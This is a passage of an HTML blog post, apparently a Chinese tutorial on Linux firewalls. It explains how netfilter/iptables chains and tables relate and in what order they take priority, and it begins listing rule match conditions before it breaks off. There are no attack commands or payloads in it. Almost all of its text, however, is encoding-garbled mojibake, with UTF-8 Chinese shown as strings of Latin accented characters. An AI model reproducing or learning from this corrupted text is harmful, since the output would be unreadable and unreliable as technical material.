ä¸»æœºé˜²ç«å¢™ä¸»å†…ï¼ˆä¸ªäººï¼‰ã€‚</p><hr><blockquote><p>ä»ç‰©ç†ä¸Šè®²ï¼Œé˜²ç«å¢™å¯ä»¥åˆ†ä¸ºç¡¬ä»¶é˜²ç«å¢™å’Œè½¯ä»¶é˜²ç«å¢™ã€‚</p></blockquote><p>ç¡¬ä»¶é˜²ç«å¢™ï¼šåœ¨ç¡¬ä»¶çº§åˆ«å®ç°éƒ¨åˆ†é˜²ç«å¢™åŠŸèƒ½ï¼Œå¦ä¸€éƒ¨åˆ†åŠŸèƒ½åŸºäºè½¯ä»¶å®ç°ï¼Œæ€§èƒ½é«˜ï¼Œæˆæœ¬é«˜ã€‚</p><p>è½¯ä»¶é˜²ç«å¢™ï¼šåº”ç”¨è½¯ä»¶å¤„ç†é€»è¾‘è¿è¡Œäºé€šç”¨ç¡¬ä»¶å¹³å°ä¹‹ä¸Šçš„é˜²ç«å¢™ï¼Œæ€§èƒ½ä½ï¼Œæˆæœ¬ä½ã€‚</p><p>è€Œæ¸—é€æµ‹è¯•è¿‡ç¨‹ä¸­ï¼Œå¸¸å¸¸ä¼šé‡è§WAFï¼ŒWeb Application Firewallï¼ˆWeb åº”ç”¨é˜²ç«å¢™ã€‚æ¯”å¦‚é•¿äº­çš„é›·æ± ï¼ˆSafeLineï¼‰ï¼ŒåŸºäºè¯­ä¹‰åˆ†æï¼Œéå¸¸å‰å®³ï¼Œè¦æ˜¯é‡åˆ°äº†å°±åˆ«æƒ³æ€ä¹ˆç»•äº†ï¼ˆÃ—</p><h1 id="iptables"><a href="#iptables" class="headerlink" title="iptables"></a>iptables</h1><p><code>iptables</code> åªæœ‰Linux ç³»çš„ç³»ç»Ÿæ‰æœ‰ã€‚</p><p><strong>iptables</strong>å…¶å®ä¸æ˜¯çœŸæ­£çš„é˜²ç«å¢™ï¼Œæˆ‘ä»¬å¯ä»¥æŠŠå®ƒç†è§£æˆä¸€ä¸ªå®¢æˆ·ç«¯ä»£ç†ï¼Œç”¨æˆ·é€šè¿‡iptablesè¿™ä¸ªä»£ç†ï¼Œå°†ç”¨æˆ·çš„å®‰å…¨è®¾å®šæ‰§è¡Œåˆ°å¯¹åº”çš„â€å®‰å…¨æ¡†æ¶â€ä¸­ï¼Œè¿™ä¸ªâ€å®‰å…¨æ¡†æ¶â€æ‰æ˜¯çœŸæ­£çš„é˜²ç«å¢™ï¼Œè¿™ä¸ªæ¡†æ¶çš„åå­—å«<strong>netfilter</strong></p><p>netfilteræ‰æ˜¯é˜²ç«å¢™çœŸæ­£çš„å®‰å…¨æ¡†æ¶ï¼ˆframeworkï¼‰ï¼Œnetfilterä½äºå†…æ ¸ç©ºé—´ã€‚</p><p>iptableså…¶å®æ˜¯ä¸€ä¸ªå‘½ä»¤è¡Œå·¥å…·ï¼Œä½äºç”¨æˆ·ç©ºé—´ï¼Œæˆ‘ä»¬ç”¨è¿™ä¸ªå·¥å…·æ“ä½œçœŸæ­£çš„æ¡†æ¶ã€‚</p><p>netfilter/iptablesï¼ˆä¸‹æ–‡ä¸­ç®€ç§°ä¸ºiptablesï¼‰ç»„æˆLinuxå¹³å°ä¸‹çš„åŒ…è¿‡æ»¤é˜²ç«å¢™ï¼Œä¸å¤§å¤šæ•°çš„Linuxè½¯ä»¶ä¸€æ ·ï¼Œè¿™ä¸ªåŒ…è¿‡æ»¤é˜²ç«å¢™æ˜¯å…è´¹çš„ï¼Œå®ƒå¯ä»¥ä»£æ›¿æ˜‚è´µçš„å•†ä¸šé˜²ç«å¢™è§£å†³æ–¹æ¡ˆï¼Œå®Œæˆ<code>å°åŒ…è¿‡æ»¤</code>ã€<code>å°åŒ…é‡å®šå‘</code>å’Œ<code>ç½‘ç»œåœ°å€è½¬æ¢ï¼ˆNATï¼‰</code>ç­‰åŠŸèƒ½ã€‚</p><p>Netfilteræ˜¯Linuxæ“ä½œç³»ç»Ÿæ ¸å¿ƒå±‚å†…éƒ¨çš„ä¸€ä¸ªæ•°æ®åŒ…å¤„ç†æ¨¡å—ï¼Œå®ƒå…·æœ‰å¦‚ä¸‹åŠŸèƒ½ï¼š</p><ul><li><p>ç½‘ç»œåœ°å€è½¬æ¢(Network Address Translate)</p></li><li><p>æ•°æ®åŒ…å†…å®¹ä¿®æ”¹</p></li><li><p>æ•°æ®åŒ…è¿‡æ»¤çš„é˜²ç«å¢™åŠŸèƒ½</p></li></ul><p>æ‰€ä»¥è¯´ï¼Œè™½ç„¶æˆ‘ä»¬ä½¿ç”¨service iptables startå¯åŠ¨iptablesâ€æœåŠ¡â€ï¼Œä½†æ˜¯å…¶å®å‡†ç¡®çš„æ¥è¯´ï¼Œiptableså¹¶<code>æ²¡æœ‰ä¸€ä¸ªå®ˆæŠ¤è¿›ç¨‹</code>ï¼Œæ‰€ä»¥å¹¶ä¸èƒ½ç®—æ˜¯çœŸæ­£æ„ä¹‰ä¸Šçš„æœåŠ¡ï¼Œè€Œåº”è¯¥ç®—æ˜¯<code>å†…æ ¸æä¾›çš„åŠŸèƒ½</code>ã€‚</p><h2 id="Iptables-åŸºç¡€"><a href="#Iptables-åŸºç¡€" class="headerlink" title="Iptables åŸºç¡€"></a>Iptables åŸºç¡€</h2><p>Iptables æ˜¯æŒ‰ç…§â€œè§„åˆ™â€åŠäº‹çš„ï¼Œè§„åˆ™å…¶å®å°±æ˜¯ç½‘ç»œç®¡ç†å‘˜é¢„å®šä¹‰çš„æ¡ä»¶ï¼Œè§„åˆ™ä¸€èˆ¬çš„å®šä¹‰ä¸º<code>&quot;å¦‚æœæ•°æ®åŒ…å¤´ç¬¦åˆè¿™æ ·çš„æ¡ä»¶ï¼Œå°±è¿™æ ·å¤„ç†è¿™ä¸ªæ•°æ®åŒ…&quot;</code>ã€‚</p><blockquote><p>è§„åˆ™å­˜å‚¨åœ¨å†…æ ¸ç©ºé—´çš„ä¿¡æ¯åŒ…è¿‡æ»¤è¡¨ä¸­ï¼Œè¿™äº›è§„åˆ™åˆ†åˆ«æŒ‡å®šäº†æºåœ°å€ã€ç›®çš„åœ°å€ã€ä¼ è¾“åè®®ï¼ˆå¦‚TCPã€UDPã€ICMPï¼‰å’ŒæœåŠ¡ç±»å‹ï¼ˆå¦‚HTTPã€FTPå’ŒSMTPï¼‰ç­‰ã€‚å½“æ•°æ®åŒ…ä¸è§„åˆ™åŒ¹é…æ—¶ï¼Œiptableså°±æ ¹æ®è§„åˆ™æ‰€å®šä¹‰çš„æ–¹æ³•æ¥å¤„ç†è¿™äº›æ•°æ®åŒ…ï¼Œå¦‚æ”¾è¡Œï¼ˆacceptï¼‰ã€æ‹’ç»ï¼ˆrejectï¼‰å’Œä¸¢å¼ƒï¼ˆdropï¼‰ç­‰ã€‚é…ç½®é˜²ç«å¢™çš„ä¸»è¦å·¥ä½œå°±æ˜¯æ·»åŠ ã€ä¿®æ”¹å’Œåˆ é™¤è¿™äº›è§„åˆ™ã€‚</p></blockquote><p>å½“å®¢æˆ·ç«¯è®¿é—®æœåŠ¡å™¨çš„webæœåŠ¡æ—¶ï¼Œå®¢æˆ·ç«¯å‘é€æŠ¥æ–‡åˆ°ç½‘å¡ï¼Œè€Œ<strong>tcp/ipåè®®æ ˆæ˜¯å±äºå†…æ ¸çš„ä¸€éƒ¨åˆ†</strong>ï¼Œæ‰€ä»¥ï¼Œå®¢æˆ·ç«¯çš„ä¿¡æ¯ä¼šé€šè¿‡å†…æ ¸çš„TCPåè®®ä¼ è¾“åˆ°ç”¨æˆ·ç©ºé—´ä¸­çš„webæœåŠ¡ä¸­ï¼Œè€Œæ­¤æ—¶ï¼Œå®¢æˆ·ç«¯æŠ¥æ–‡çš„ç›®æ ‡ç»ˆç‚¹ä¸ºwebæœåŠ¡æ‰€ç›‘å¬çš„å¥—æ¥å­—ï¼ˆIPï¼šPortï¼‰ä¸Šï¼Œå½“webæœåŠ¡éœ€è¦å“åº”å®¢æˆ·ç«¯è¯·æ±‚æ—¶ï¼ŒwebæœåŠ¡å‘å‡ºçš„å“åº”æŠ¥æ–‡çš„ç›®æ ‡ç»ˆç‚¹åˆ™ä¸ºå®¢æˆ·ç«¯ï¼Œè¿™ä¸ªæ—¶å€™ï¼ŒwebæœåŠ¡æ‰€ç›‘å¬çš„IPä¸ç«¯å£åè€Œå˜æˆäº†åŸç‚¹ï¼Œæˆ‘ä»¬è¯´è¿‡ï¼Œnetfilteræ‰æ˜¯çœŸæ­£çš„é˜²ç«å¢™ï¼Œå®ƒæ˜¯å†…æ ¸çš„ä¸€éƒ¨åˆ†ï¼Œæ‰€ä»¥ï¼Œå¦‚æœæˆ‘ä»¬æƒ³è¦é˜²ç«å¢™èƒ½å¤Ÿè¾¾åˆ°â€é˜²ç«â€çš„ç›®çš„ï¼Œåˆ™éœ€è¦åœ¨å†…æ ¸ä¸­è®¾ç½®å…³å¡ï¼Œæ‰€æœ‰è¿›å‡ºçš„æŠ¥æ–‡éƒ½è¦é€šè¿‡è¿™äº›å…³å¡ï¼Œç»è¿‡æ£€æŸ¥åï¼Œç¬¦åˆæ”¾è¡Œæ¡ä»¶çš„æ‰èƒ½æ”¾è¡Œï¼Œç¬¦åˆé˜»æ‹¦æ¡ä»¶çš„åˆ™éœ€è¦è¢«é˜»æ­¢ï¼Œäºæ˜¯ï¼Œå°±å‡ºç°äº†inputå…³å¡å’Œoutputå…³å¡ï¼Œ<strong>è€Œè¿™äº›å…³å¡åœ¨iptablesä¸­ä¸è¢«ç§°ä¸ºâ€å…³å¡â€,è€Œè¢«ç§°ä¸ºâ€é“¾â€ã€‚</strong></p><p><img src="http://www.zsythink.net/wp-content/uploads/2017/02/021217_0051_1.png"></p><p>ä¸Šé¢æè¿°çš„åœºæ™¯å¹¶ä¸å®Œå–„ï¼Œå› ä¸º<strong>å®¢æˆ·ç«¯å‘æ¥çš„æŠ¥æ–‡è®¿é—®çš„ç›®æ ‡åœ°å€å¯èƒ½å¹¶ä¸æ˜¯æœ¬æœºï¼Œè€Œæ˜¯å…¶ä»–æœåŠ¡å™¨ï¼Œå½“æœ¬æœºçš„å†…æ ¸æ”¯æŒIP_FORWARDæ—¶ï¼Œæˆ‘ä»¬å¯ä»¥å°†æŠ¥æ–‡è½¬å‘ç»™å…¶ä»–æœåŠ¡å™¨</strong>ï¼Œæ‰€ä»¥ï¼Œè¿™ä¸ªæ—¶å€™ï¼Œæˆ‘ä»¬å°±ä¼šæåˆ°iptablesä¸­çš„å…¶ä»–â€å…³å¡â€ï¼Œä¹Ÿå°±æ˜¯å…¶ä»–â€é“¾â€ï¼Œä»–ä»¬å°±æ˜¯  â€œè·¯ç”±å‰â€ã€â€è½¬å‘â€ã€â€è·¯ç”±åâ€ï¼Œä»–ä»¬çš„è‹±æ–‡åæ˜¯</p><p>PREROUTINGã€FORWARDã€POSTROUTING</p><p>æ ¹æ®å®é™…æƒ…å†µçš„ä¸åŒï¼ŒæŠ¥æ–‡ç»è¿‡â€é“¾â€å¯èƒ½ä¸åŒã€‚<strong>å¦‚æœæŠ¥æ–‡éœ€è¦è½¬å‘ï¼Œé‚£ä¹ˆæŠ¥æ–‡åˆ™ä¸ä¼šç»è¿‡inputé“¾å‘å¾€ç”¨æˆ·ç©ºé—´ï¼Œè€Œæ˜¯ç›´æ¥åœ¨å†…æ ¸ç©ºé—´ä¸­ç»è¿‡forwardé“¾å’Œpostroutingé“¾è½¬å‘å‡ºå»çš„ã€‚</strong></p><p><img src="http://www.zsythink.net/wp-content/uploads/2017/02/021217_0051_2.png"></p><p>å¸¸è§åœºæ™¯ä¸­æŠ¥æ–‡çš„æµå‘ï¼š</p><ul><li><p>åˆ°æœ¬æœºæŸè¿›ç¨‹çš„æŠ¥æ–‡ï¼šPREROUTING â€“&gt; INPUT</p></li><li><p>ç”±æœ¬æœºè½¬å‘çš„æŠ¥æ–‡ï¼šPREROUTING â€“&gt; FORWARD â€“&gt; POSTROUTING</p></li><li><p>ç”±æœ¬æœºçš„æŸè¿›ç¨‹å‘å‡ºæŠ¥æ–‡ï¼ˆé€šå¸¸ä¸ºå“åº”æŠ¥æ–‡ï¼‰ï¼šOUTPUT â€“&gt; POSTROUTING</p></li></ul><h2 id="é“¾çš„æ¦‚å¿µ"><a href="#é“¾çš„æ¦‚å¿µ" class="headerlink" title="é“¾çš„æ¦‚å¿µ"></a>é“¾çš„æ¦‚å¿µ</h2><p>ä¸ºä»€ä¹ˆâ€œå…³å¡â€ åœ¨ iptables ä¸­è¢«ç§°åšâ€œé“¾ï¼š</p><p>é˜²ç«å¢™çš„ä½œç”¨å°±åœ¨äºå¯¹ç»è¿‡æŠ¥æ–‡åŒ¹é…â€œè§„åˆ™â€ï¼Œç„¶åæ‰§è¡Œç›¸å¯¹åº”çš„â€œåŠ¨ä½œâ€ã€‚ç„¶è€Œå…³å¡ä¸Šä¸åªåªæœ‰ä¸€æ¡è§„åˆ™ï¼Œè€Œä¸”æœ‰å¾ˆå¤šæ¡è§„åˆ™ï¼Œå½“æˆ‘ä»¬æŠŠè¿™äº›è§„åˆ™ä¸²åˆ°ä¸€ä¸ªé“¾æ¡ä¸Šçš„æ—¶å€™ï¼Œå°±å½¢æˆäº†â€é“¾â€ã€‚</p><p><img src="http://www.zsythink.net/wp-content/uploads/2017/02/021217_0051_3.png"></p><p>æ¯ä¸ªç»è¿‡è¿™ä¸ªâ€å…³å¡â€çš„æŠ¥æ–‡ï¼Œéƒ½è¦å°†è¿™æ¡â€é“¾â€ä¸Šçš„æ‰€æœ‰è§„åˆ™åŒ¹é…ä¸€éï¼Œå¦‚æœæœ‰ç¬¦åˆæ¡ä»¶çš„è§„åˆ™ï¼Œåˆ™æ‰§è¡Œè§„åˆ™å¯¹åº”çš„åŠ¨ä½œã€‚</p><h2 id="è¡¨çš„æ¦‚å¿µ"><a href="#è¡¨çš„æ¦‚å¿µ" class="headerlink" title="è¡¨çš„æ¦‚å¿µ"></a>è¡¨çš„æ¦‚å¿µ</h2><blockquote><p>æˆ‘ä»¬å†æƒ³æƒ³å¦å¤–ä¸€ä¸ªé—®é¢˜ï¼Œæˆ‘ä»¬å¯¹æ¯ä¸ªâ€é“¾â€ä¸Šéƒ½æ”¾ç½®äº†ä¸€ä¸²è§„åˆ™ï¼Œä½†æ˜¯è¿™äº›è§„åˆ™æœ‰äº›å¾ˆç›¸ä¼¼ï¼Œæ¯”å¦‚ï¼ŒAç±»è§„åˆ™éƒ½æ˜¯å¯¹IPæˆ–è€…ç«¯å£çš„è¿‡æ»¤ï¼ŒBç±»è§„åˆ™æ˜¯ä¿®æ”¹æŠ¥æ–‡ï¼Œé‚£ä¹ˆè¿™ä¸ªæ—¶å€™ï¼Œæˆ‘ä»¬æ˜¯ä¸æ˜¯èƒ½<strong>æŠŠå®ç°ç›¸åŒåŠŸèƒ½çš„è§„åˆ™æ”¾åœ¨ä¸€èµ·</strong>å‘¢ï¼Œå¿…é¡»èƒ½çš„ã€‚</p></blockquote><p>æŠŠå…·æœ‰ç›¸åŒåŠŸèƒ½çš„è§„åˆ™çš„é›†åˆå«åšâ€è¡¨â€ï¼Œæ‰€ä»¥è¯´ï¼Œä¸åŒåŠŸèƒ½çš„è§„åˆ™ï¼Œæˆ‘ä»¬å¯ä»¥æ”¾ç½®åœ¨ä¸åŒçš„è¡¨ä¸­è¿›è¡Œç®¡ç†ï¼Œè€Œiptableså·²ç»ä¸ºæˆ‘ä»¬å®šä¹‰äº†4ç§è¡¨ï¼Œæ¯ç§è¡¨å¯¹åº”äº†ä¸åŒçš„åŠŸèƒ½ï¼Œè€Œæˆ‘ä»¬å®šä¹‰çš„è§„åˆ™ä¹Ÿéƒ½é€ƒè„±ä¸äº†è¿™4ç§åŠŸèƒ½çš„èŒƒå›´ï¼Œæ‰€ä»¥ï¼Œå­¦ä¹ iptablesä¹‹å‰ï¼Œæˆ‘ä»¬å¿…é¡»å…ˆææ˜ç™½æ¯ç§è¡¨ çš„ä½œç”¨ã€‚</p><p>iptablesä¸ºæˆ‘ä»¬æä¾›äº†å¦‚ä¸‹è§„åˆ™çš„åˆ†ç±»ï¼Œæˆ–è€…è¯´ï¼Œiptablesä¸ºæˆ‘ä»¬æä¾›äº†å¦‚ä¸‹â€è¡¨â€</p><ul><li><p>filterè¡¨ï¼šè´Ÿè´£è¿‡æ»¤åŠŸèƒ½ï¼Œé˜²ç«å¢™ï¼›å†…æ ¸æ¨¡å—ï¼šiptables_filter</p></li><li><p>natè¡¨ï¼šnetwork address translationï¼Œç½‘ç»œåœ°å€è½¬æ¢åŠŸèƒ½ï¼›å†…æ ¸æ¨¡å—ï¼šiptable_nat</p></li><li><p>mangleè¡¨ï¼šæ‹†è§£æŠ¥æ–‡ï¼Œåšå‡ºä¿®æ”¹ï¼Œå¹¶é‡æ–°å°è£… çš„åŠŸèƒ½ï¼›iptable_mangle</p></li><li><p>rawè¡¨ï¼šå…³é—­natè¡¨ä¸Šå¯ç”¨çš„è¿æ¥è¿½è¸ªæœºåˆ¶ï¼›iptable_raw</p></li></ul><p>ä¹Ÿå°±æ˜¯è¯´ï¼Œæˆ‘ä»¬è‡ªå®šä¹‰çš„æ‰€æœ‰è§„åˆ™ï¼Œéƒ½æ˜¯è¿™å››ç§åˆ†ç±»ä¸­çš„è§„åˆ™ï¼Œæˆ–è€…è¯´ï¼Œæ‰€æœ‰è§„åˆ™éƒ½å­˜åœ¨äºè¿™4å¼ â€è¡¨â€ä¸­ã€‚</p><p></p><h2 id="è¡¨é“¾å…³ç³»"><a href="#è¡¨é“¾å…³ç³»" class="headerlink" title="è¡¨é“¾å…³ç³»"></a>è¡¨é“¾å…³ç³»</h2><blockquote><p>æŸäº›â€œé“¾â€ä¸­æ³¨å®šä¸ä¼šåŒ…å«â€œæŸç±»è§„åˆ™â€ã€‚</p></blockquote><p><img src="http://www.zsythink.net/wp-content/uploads/2017/02/021217_0051_4.png" alt="preroutingé“¾ä¸Šçš„è§„åˆ™å­˜åœ¨çš„è¡¨æƒ…å†µ"></p><blockquote><p>preroutingâ€é“¾â€åªæ‹¥æœ‰natè¡¨ã€rawè¡¨å’Œmangleè¡¨æ‰€å¯¹åº”çš„åŠŸèƒ½ï¼Œæ‰€ä»¥ï¼Œpreroutingä¸­çš„è§„åˆ™åªèƒ½å­˜æ”¾äºnatè¡¨ã€rawè¡¨å’Œmangleè¡¨ä¸­</p></blockquote><p>PREROUTING    çš„è§„åˆ™å¯ä»¥å­˜åœ¨äºï¼šrawè¡¨ï¼Œmangleè¡¨ï¼Œnatè¡¨ã€‚</p><p>INPUT      çš„è§„åˆ™å¯ä»¥å­˜åœ¨äºï¼šmangleè¡¨ï¼Œfilterè¡¨ï¼Œï¼ˆcentos7ä¸­è¿˜æœ‰natè¡¨ï¼Œcentos6ä¸­æ²¡æœ‰ï¼‰ã€‚</p><p>FORWARD     çš„è§„åˆ™å¯ä»¥å­˜åœ¨äºï¼šmangleè¡¨ï¼Œfilterè¡¨ã€‚</p><p>OUTPUT     çš„è§„åˆ™å¯ä»¥å­˜åœ¨äºï¼šrawè¡¨mangleè¡¨ï¼Œnatè¡¨ï¼Œfilterè¡¨ã€‚</p><p>POSTROUTING    çš„è§„åˆ™å¯ä»¥å­˜åœ¨äºï¼šmangleè¡¨ï¼Œnatè¡¨ã€‚</p><p><strong>åœ¨å®é™…çš„ä½¿ç”¨è¿‡ç¨‹ä¸­ï¼Œå¾€å¾€æ˜¯é€šè¿‡â€è¡¨â€ä½œä¸ºæ“ä½œå…¥å£ï¼Œå¯¹è§„åˆ™è¿›è¡Œå®šä¹‰çš„</strong>ï¼Œä¹‹æ‰€ä»¥æŒ‰ç…§ä¸Šè¿°è¿‡ç¨‹ä»‹ç»iptablesï¼Œæ˜¯å› ä¸ºä»â€å…³å¡â€çš„è§’åº¦æ›´å®¹æ˜“ä»å…¥é—¨çš„è§’åº¦ç†è§£ï¼Œä½†æ˜¯ä¸ºäº†ä»¥ä¾¿åœ¨å®é™…ä½¿ç”¨çš„æ—¶å€™ï¼Œæ›´åŠ é¡ºç•…çš„ç†è§£å®ƒä»¬ï¼Œæ­¤å¤„æˆ‘ä»¬è¿˜è¦å°†å„â€è¡¨â€ä¸â€é“¾â€çš„å…³ç³»ç½—åˆ—å‡ºæ¥ï¼Œ</p><p>è¡¨ï¼ˆåŠŸèƒ½ï¼‰&lt;â€“&gt;  é“¾ï¼ˆé’©å­ï¼‰ï¼š</p><p>raw   è¡¨ä¸­çš„è§„åˆ™å¯ä»¥è¢«å“ªäº›é“¾ä½¿ç”¨ï¼šPREROUTINGï¼ŒOUTPUT</p><p>mangle  è¡¨ä¸­çš„è§„åˆ™å¯ä»¥è¢«å“ªäº›é“¾ä½¿ç”¨ï¼šPREROUTINGï¼ŒINPUTï¼ŒFORWARDï¼ŒOUTPUTï¼ŒPOSTROUTING</p><p>nat   è¡¨ä¸­çš„è§„åˆ™å¯ä»¥è¢«å“ªäº›é“¾ä½¿ç”¨ï¼šPREROUTINGï¼ŒOUTPUTï¼ŒPOSTROUTINGï¼ˆcentos7ä¸­è¿˜æœ‰INPUTï¼Œcentos6ä¸­æ²¡æœ‰ï¼‰</p><p>filter  è¡¨ä¸­çš„è§„åˆ™å¯ä»¥è¢«å“ªäº›é“¾ä½¿ç”¨ï¼šINPUTï¼ŒFORWARDï¼ŒOUTPUT</p><hr><p>å…¶å®æˆ‘ä»¬è¿˜éœ€è¦æ³¨æ„ä¸€ç‚¹ï¼Œå› ä¸ºæ•°æ®åŒ…ç»è¿‡ä¸€ä¸ªâ€é“¾â€çš„æ—¶å€™ï¼Œä¼šå°†å½“å‰é“¾çš„æ‰€æœ‰è§„åˆ™éƒ½åŒ¹é…ä¸€éï¼Œä½†æ˜¯åŒ¹é…æ—¶æ€»å½’è¦æœ‰é¡ºåºï¼Œæˆ‘ä»¬åº”è¯¥ä¸€æ¡ä¸€æ¡çš„å»åŒ¹é…ï¼Œè€Œä¸”æˆ‘ä»¬è¯´è¿‡ï¼Œç›¸åŒåŠŸèƒ½ç±»å‹çš„è§„åˆ™ä¼šæ±‡èšåœ¨ä¸€å¼ â€è¡¨â€ä¸­ï¼Œé‚£ä¹ˆï¼Œå“ªäº›â€è¡¨â€ä¸­çš„è§„åˆ™ä¼šæ”¾åœ¨â€é“¾â€çš„æœ€å‰é¢æ‰§è¡Œå‘¢ï¼Œè¿™æ—¶å€™å°±éœ€è¦æœ‰ä¸€ä¸ªä¼˜å…ˆçº§çš„é—®é¢˜ï¼Œæˆ‘ä»¬è¿˜æ‹¿preroutingâ€é“¾â€åšå›¾ç¤ºã€‚<br><img src="http://www.zsythink.net/wp-content/uploads/2017/02/021217_0051_5.png"></p><p>preroutingé“¾ä¸­çš„è§„åˆ™å­˜æ”¾äºä¸‰å¼ è¡¨ä¸­ï¼Œè€Œè¿™ä¸‰å¼ è¡¨ä¸­çš„è§„åˆ™æ‰§è¡Œçš„ä¼˜å…ˆçº§å¦‚ä¸‹ï¼š</p><p>raw â€“&gt; mangle â€“&gt; nat</p><p>ä½†æ˜¯æˆ‘ä»¬çŸ¥é“ï¼Œ<strong>iptablesä¸ºæˆ‘ä»¬å®šä¹‰äº†4å¼ â€è¡¨â€,å½“ä»–ä»¬å¤„äºåŒä¸€æ¡â€é“¾â€æ—¶ï¼Œæ‰§è¡Œçš„ä¼˜å…ˆçº§å¦‚ä¸‹ã€‚</strong></p><p>ä¼˜å…ˆçº§æ¬¡åºï¼ˆç”±é«˜è€Œä½ï¼‰ï¼š</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">raw --&gt; mangle --&gt; nat --&gt; filter</span><br></pre></td></tr></table></figure><p>å‰é¢è¯´è¿‡ï¼ŒæŸäº›é“¾å¤©ç”Ÿå°±ä¸èƒ½ä½¿ç”¨æŸäº›è¡¨ä¸­çš„è§„åˆ™ï¼Œæ‰€ä»¥ï¼Œ<strong>4å¼ è¡¨ä¸­çš„è§„åˆ™å¤„äºåŒä¸€æ¡é“¾çš„ç›®å‰åªæœ‰outputé“¾</strong>ï¼Œå®ƒå°±æ˜¯ä¼ è¯´ä¸­æµ·é™†ç©ºéƒ½èƒ½é˜²å®ˆçš„å…³å¡ã€‚</p><h2 id="æ•°æ®ç»è¿‡é˜²ç«å¢™çš„æµç¨‹"><a href="#æ•°æ®ç»è¿‡é˜²ç«å¢™çš„æµç¨‹" class="headerlink" title="æ•°æ®ç»è¿‡é˜²ç«å¢™çš„æµç¨‹"></a>æ•°æ®ç»è¿‡é˜²ç«å¢™çš„æµç¨‹</h2><p><img src="http://www.zsythink.net/wp-content/uploads/2017/02/021217_0051_6.png"></p><p>æˆ‘ä»¬å°†ç»å¸¸ç”¨åˆ°çš„å¯¹åº”å…³ç³»é‡æ–°å†™åœ¨æ­¤å¤„ï¼Œæ–¹ä¾¿å¯¹åº”å›¾ä¾‹æŸ¥çœ‹ã€‚</p><p>é“¾çš„è§„åˆ™å­˜æ”¾äºå“ªäº›è¡¨ä¸­ï¼ˆä»é“¾åˆ°è¡¨çš„å¯¹åº”å…³ç³»ï¼‰ï¼š</p><p>PREROUTING  çš„è§„åˆ™å¯ä»¥å­˜åœ¨äºï¼šrawè¡¨ï¼Œmangleè¡¨ï¼Œnatè¡¨ã€‚</p><p>INPUT     çš„è§„åˆ™å¯ä»¥å­˜åœ¨äºï¼šmangleè¡¨ï¼Œfilterè¡¨ï¼Œï¼ˆcentos7ä¸­è¿˜æœ‰natè¡¨ï¼Œcentos6ä¸­æ²¡æœ‰ï¼‰ã€‚</p><p>FORWARD    çš„è§„åˆ™å¯ä»¥å­˜åœ¨äºï¼šmangleè¡¨ï¼Œfilterè¡¨ã€‚</p><p>OUTPUT    çš„è§„åˆ™å¯ä»¥å­˜åœ¨äºï¼šrawè¡¨mangleè¡¨ï¼Œnatè¡¨ï¼Œfilterè¡¨ã€‚</p><p>POSTROUTING  çš„è§„åˆ™å¯ä»¥å­˜åœ¨äºï¼šmangleè¡¨ï¼Œnatè¡¨ã€‚</p><hr><p>è¡¨ä¸­çš„è§„åˆ™å¯ä»¥è¢«å“ªäº›é“¾ä½¿ç”¨ï¼ˆä»è¡¨åˆ°é“¾çš„å¯¹åº”å…³ç³»ï¼‰ï¼š</p><p>raw   è¡¨ä¸­çš„è§„åˆ™å¯ä»¥è¢«å“ªäº›é“¾ä½¿ç”¨ï¼šPREROUTINGï¼ŒOUTPUT</p><p>mangle  è¡¨ä¸­çš„è§„åˆ™å¯ä»¥è¢«å“ªäº›é“¾ä½¿ç”¨ï¼šPREROUTINGï¼ŒINPUTï¼ŒFORWARDï¼ŒOUTPUTï¼ŒPOSTROUTING</p><p>nat   è¡¨ä¸­çš„è§„åˆ™å¯ä»¥è¢«å“ªäº›é“¾ä½¿ç”¨ï¼šPREROUTINGï¼ŒOUTPUTï¼ŒPOSTROUTINGï¼ˆcentos7ä¸­è¿˜æœ‰INPUTï¼Œcentos6ä¸­æ²¡æœ‰ï¼‰</p><p>filter  è¡¨ä¸­çš„è§„åˆ™å¯ä»¥è¢«å“ªäº›é“¾ä½¿ç”¨ï¼šINPUTï¼ŒFORWARDï¼ŒOUTPUT</p><p>ä¸‹å›¾ä¸­natè¡¨åœ¨centos7ä¸­çš„æƒ…å†µå°±ä¸å†æ ‡æ˜ã€‚</p><p><img src="http://www.zsythink.net/wp-content/uploads/2017/02/021217_0051_7.png"></p><h2 id="è§„åˆ™çš„æ¦‚å¿µ"><a href="#è§„åˆ™çš„æ¦‚å¿µ" class="headerlink" title="è§„åˆ™çš„æ¦‚å¿µ"></a>è§„åˆ™çš„æ¦‚å¿µ</h2><p>è§„åˆ™ï¼šæ ¹æ®æŒ‡å®šçš„åŒ¹é…æ¡ä»¶æ¥å°è¯•åŒ¹é…æ¯ä¸ªæµç»æ­¤å¤„çš„æŠ¥æ–‡ï¼Œä¸€æ—¦åŒ¹é…æˆåŠŸï¼Œåˆ™ç”±è§„åˆ™åé¢æŒ‡å®šçš„å¤„ç†åŠ¨ä½œè¿›è¡Œå¤„ç†</p><p>è§„åˆ™ç”±åŒ¹é…æ¡ä»¶å’Œå¤„ç†åŠ¨ä½œç»„æˆã€‚</p><ul><li>åŒ¹é…æ¡ä»¶</li></ul><p>åŒ¹é…æ¡ä»¶åˆ†ä¸ºåŸºæœ¬åŒ¹é…æ¡ä»¶ä¸æ‰©å±•åŒ¹é…æ¡ä»¶</p><p><strong>åŸºæœ¬åŒ¹é…æ¡ä»¶ï¼š</strong></p><p>æºåœ°å€Source IPï¼Œç›®æ ‡åœ°å€ Destination IP</p><p>ä¸Šè¿°å†…å®¹éƒ½å¯ä»¥ä½œä¸ºåŸºæœ¬åŒ¹é…æ¡ä»¶ã€‚</p><p><strong>æ‰©å±•åŒ¹é…æ¡ä»¶ï¼š</strong></p><p>é™¤äº†ä¸Šè¿°çš„æ¡ä»¶å¯ä»¥ç”¨äºåŒ¹é…ï¼Œè¿˜æœ‰å¾ˆå¤šå…¶ä»–çš„æ¡ä»¶å¯ä»¥ç”¨äºåŒ¹é…ï¼Œè¿™äº›æ¡ä»¶æ³›ç§°ä¸ºæ‰©å±•æ¡ä»¶ï¼Œè¿™äº›æ‰©å±•æ¡ä»¶å…¶å®ä¹Ÿæ˜¯netfilterä¸­çš„ä¸€éƒ¨åˆ†ï¼Œåªæ˜¯ä»¥æ¨¡å—çš„å½¢å¼å­˜åœ¨ï¼Œå¦‚æœæƒ³è¦ä½¿ç”¨è¿™äº›æ¡ä»¶ï¼Œåˆ™éœ€è¦ä¾èµ–å¯¹åº”çš„æ‰©å±•æ¨¡å—ã€‚</p><p>æºç«¯å£Source Port, ç›®æ ‡ç«¯å£Destination 